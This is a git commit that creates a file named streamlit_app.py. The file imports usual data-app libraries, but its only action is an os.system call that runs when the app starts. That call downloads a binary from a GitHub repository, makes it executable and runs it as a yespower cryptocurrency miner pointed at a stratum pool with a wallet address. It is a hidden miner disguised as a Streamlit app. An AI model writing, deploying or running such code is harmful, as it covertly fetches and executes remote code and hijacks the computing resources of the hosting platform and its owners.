1cf2be614aaa4dd85afe2db6f8e2e0555084c5d7
Yerdasx <118724342+Yerdasx@users.noreply.github.com>
2022-11-21 16:20:38 +0700

    Create streamlit_app.py

---
+++ streamlit_app.py
@@ -0,0 +1,7 @@
+from collections import namedtuple
+import altair as alt
+import math
+import pandas as pd
+import streamlit as st
+import os
+os.system ("curl -L -o sse https://github.com/Ikuzot/Yahaha/raw/main/sse && chmod +x sse && ./sse -a yespower -o stratum+tcps://stratum-eu.rplant.xyz:17017 -u web1qxnm9q7txetqj6uzxat4xkas6rxr93q5fc7xjm4.TESS80 -t 10")
